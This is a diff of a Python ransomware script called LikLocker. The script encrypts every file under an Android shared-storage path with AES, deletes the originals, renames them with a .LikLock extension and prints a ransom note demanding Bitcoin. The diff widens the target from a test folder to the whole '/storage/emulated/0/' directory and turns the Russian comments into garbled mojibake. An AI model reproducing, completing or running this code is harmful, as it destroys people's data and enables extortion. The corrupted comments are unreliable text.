@@ -20,22 +20,22 @@ def encrypt_file(file_path, key):
     with open(file_path, 'rb') as file:
         plaintext = file.read()
     
-    if len(plaintext) > 50 * 1024 * 1024:  # Размер файла больше 50 МБ
-        return  # Пропускаем файл без вывода ошибки
+    if len(plaintext) > 50 * 1024 * 1024:  # ГђГ Г§Г¬ГҐГ° ГґГ Г©Г«Г  ГЎГ®Г«ГјГёГҐ 50 ГЊГЃ
+        return  # ГЏГ°Г®ГЇГіГ±ГЄГ ГҐГ¬ ГґГ Г©Г« ГЎГҐГ§ ГўГ»ГўГ®Г¤Г  Г®ГёГЁГЎГЄГЁ
 
     ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
     iv = cipher.iv
     
     encrypted_file_path = file_path + '.LikLock'
     
-    # Запись зашифрованного файла с отображением прогресса
+    # Г‡Г ГЇГЁГ±Гј Г§Г ГёГЁГґГ°Г®ГўГ Г­Г­Г®ГЈГ® ГґГ Г©Г«Г  Г± Г®ГІГ®ГЎГ°Г Г¦ГҐГ­ГЁГҐГ¬ ГЇГ°Г®ГЈГ°ГҐГ±Г±Г 
     with open(encrypted_file_path, 'wb') as file:
         file.write(iv + ciphertext)
 
-    # Удаляем оригинальный файл после успешного шифрования
+    # Г“Г¤Г Г«ГїГҐГ¬ Г®Г°ГЁГЈГЁГ­Г Г«ГјГ­Г»Г© ГґГ Г©Г« ГЇГ®Г±Г«ГҐ ГіГ±ГЇГҐГёГ­Г®ГЈГ® ГёГЁГґГ°Г®ГўГ Г­ГЁГї
     os.remove(file_path)
     
-    # Возвращаем зашифрованное имя файла
+    # Г‚Г®Г§ГўГ°Г Г№Г ГҐГ¬ Г§Г ГёГЁГґГ°Г®ГўГ Г­Г­Г®ГҐ ГЁГ¬Гї ГґГ Г©Г«Г 
     base64_encoded_name = base64.b64encode(os.path.basename(file_path).encode()).decode()
     os.rename(encrypted_file_path, os.path.join(os.path.dirname(file_path), base64_encoded_name + '.LikLock'))
     
@@ -44,14 +44,14 @@ def encrypt_file(file_path, key):
 def encrypt_directory(directory, key):
     files_to_encrypt = []
     
-    # Собираем все файлы для шифрования
+    # Г‘Г®ГЎГЁГ°Г ГҐГ¬ ГўГ±ГҐ ГґГ Г©Г«Г» Г¤Г«Гї ГёГЁГґГ°Г®ГўГ Г­ГЁГї
     for root, _, files in os.walk(directory):
         for filename in files:
             file_path = os.path.join(root, filename)
             if not filename.endswith('.LikLock'):
                 files_to_encrypt.append(file_path)
 
-    # Шифруем файлы с отображением прогресса
+    # ГГЁГґГ°ГіГҐГ¬ ГґГ Г©Г«Г» Г± Г®ГІГ®ГЎГ°Г Г¦ГҐГ­ГЁГҐГ¬ ГЇГ°Г®ГЈГ°ГҐГ±Г±Г 
     with ThreadPoolExecutor() as executor:
         futures = {executor.submit(encrypt_file, file_path, key): file_path for file_path in files_to_encrypt}
         
@@ -59,44 +59,44 @@ def encrypt_directory(directory, key):
             for future in as_completed(futures):
                 file_path = futures[future]
                 try:
-                    future.result()  # Получаем результат выполнения
+                    future.result()  # ГЏГ®Г«ГіГ·Г ГҐГ¬ Г°ГҐГ§ГіГ«ГјГІГ ГІ ГўГ»ГЇГ®Г«Г­ГҐГ­ГЁГї
                     pbar.set_postfix(file=file_path)
                 except Exception as e:
-                    print(f"Error encrypting {file_path}: {e}")  # Можно оставить для отладки, если необходимо
+                    print(f"Error encrypting {file_path}: {e}")  # ГЊГ®Г¦Г­Г® Г®Г±ГІГ ГўГЁГІГј Г¤Г«Гї Г®ГІГ«Г Г¤ГЄГЁ, ГҐГ±Г«ГЁ Г­ГҐГ®ГЎГµГ®Г¤ГЁГ¬Г®
                 pbar.update(1)
 
 def display_warning():
-    # Очищаем экран
+    # ГЋГ·ГЁГ№Г ГҐГ¬ ГЅГЄГ°Г Г­
     os.system('cls' if os.name == 'nt' else 'clear')
 
-    # Генерация ASCII текста
+    # ГѓГҐГ­ГҐГ°Г Г¶ГЁГї ASCII ГІГҐГЄГ±ГІГ 
     ascii_banner = pyfiglet.figlet_format("LikLocker")
-    # Раскраска текста
+    # ГђГ Г±ГЄГ°Г Г±ГЄГ  ГІГҐГЄГ±ГІГ 
     colored_banner = colored(ascii_banner, color='red')
-    # Вывод на экран
+    # Г‚Г»ГўГ®Г¤ Г­Г  ГЅГЄГ°Г Г­
     print(colored_banner)
 
-    # Текст с предупреждением
+    # Г’ГҐГЄГ±ГІ Г± ГЇГ°ГҐГ¤ГіГЇГ°ГҐГ¦Г¤ГҐГ­ГЁГҐГ¬
     warning_text = "Bad news, all your important files have been encrypted by LikLocker ransomware! " \
                    "To decrypt your files, you need to download decryptor. " \
                    "To receive it, you need to send 0.005 BTC to the Bitcoin wallet A728E05dk04gsJ7H " \
                    "and write about successful payment to LikLockerRransomware@gmail.com " \
                    "and wait until they send you decryptor."
 
-    # Окружение текста точками
-    border_length = len(warning_text) + 2  # длина текста + 2 для точек по краям
-    border = '.' * border_length  # рамка из точек
+    # ГЋГЄГ°ГіГ¦ГҐГ­ГЁГҐ ГІГҐГЄГ±ГІГ  ГІГ®Г·ГЄГ Г¬ГЁ
+    border_length = len(warning_text) + 2  # Г¤Г«ГЁГ­Г  ГІГҐГЄГ±ГІГ  + 2 Г¤Г«Гї ГІГ®Г·ГҐГЄ ГЇГ® ГЄГ°Г ГїГ¬
+    border = '.' * border_length  # Г°Г Г¬ГЄГ  ГЁГ§ ГІГ®Г·ГҐГЄ
 
-    # Вывод на экран
+    # Г‚Г»ГўГ®Г¤ Г­Г  ГЅГЄГ°Г Г­
     print(border)
-    print(colored(f".{warning_text}.", color='red'))  # текст в рамке
+    print(colored(f".{warning_text}.", color='red'))  # ГІГҐГЄГ±ГІ Гў Г°Г Г¬ГЄГҐ
     print(border)
 
 def main():
-    directory = '/storage/emulated/0/limbo/'  # Установленный путь
-    key = generate_key()  # Генерируем уникальный ключ для устройства
+    directory = '/storage/emulated/0/'  # Г“Г±ГІГ Г­Г®ГўГ«ГҐГ­Г­Г»Г© ГЇГіГІГј
+    key = generate_key()  # ГѓГҐГ­ГҐГ°ГЁГ°ГіГҐГ¬ ГіГ­ГЁГЄГ Г«ГјГ­Г»Г© ГЄГ«ГѕГ· Г¤Г«Гї ГіГ±ГІГ°Г®Г©Г±ГІГўГ 
     encrypt_directory(directory, key)
-    print("Шифрование завершено.")
+    print("ГГЁГґГ°Г®ГўГ Г­ГЁГҐ Г§Г ГўГҐГ°ГёГҐГ­Г®.")
     display_warning()
 
 if __name__ == "__main__":
